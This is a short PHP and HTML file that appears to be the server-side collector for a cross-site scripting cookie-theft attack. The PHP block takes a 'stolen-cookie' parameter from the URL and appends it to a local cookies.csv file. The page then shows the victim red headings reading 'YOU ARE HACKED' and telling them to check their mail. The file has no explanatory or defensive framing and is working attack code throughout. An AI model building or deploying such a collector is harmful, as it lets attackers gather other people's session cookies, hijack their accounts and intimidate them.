<?php
    $stolen_cookie = $_GET["stolen-cookie"] . "\n";
    $file = "cookies.csv";
    file_put_contents($file, $stolen_cookie, FILE_APPEND | LOCK_EX);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1 style="color:red; text-align:center">YOU ARE HACKED</h1>
    <h1 style="color:red; text-align:center">CHECK YOUR MAIL FOR FURTHER INFORMATION</h1>
</body>
</html>